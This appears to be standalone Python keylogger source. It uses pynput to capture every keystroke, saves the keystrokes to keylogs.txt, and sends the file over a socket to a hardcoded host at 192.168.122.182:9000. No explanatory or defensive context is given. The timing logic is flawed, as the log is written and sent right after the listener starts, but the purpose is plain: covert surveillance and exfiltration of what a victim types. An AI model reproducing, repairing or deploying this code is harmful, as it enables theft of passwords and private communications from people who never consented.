```python
import pynput.keyboard
import threading
import socket
import os

log = ""

def process_key_press(key):
    global log
    try:
        log += str(key) + "\n"
    except AttributeError:
        log += " " + str(key) + " "

def report():
    global log
    print("Logging started...")
    with open("keylogs.txt", "w") as f:
        f.write(log)
    print("Logging ended.")
    transmit_file()

def transmit_file():
    server = ("192.168.122.182", 9000)
    s = socket.socket()
    s.connect(server)
    with open("keylogs.txt", "rb") as f:
        data = f.read()
        s.sendall(data)
    print("File transmitted.")
    s.close()

def start_logging():
    keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
    with keyboard_listener:
        report()
        keyboard_listener.join()

if __name__ == "__main__":
    logging_thread = threading.Thread(target=start_logging)
    logging_thread.start()
```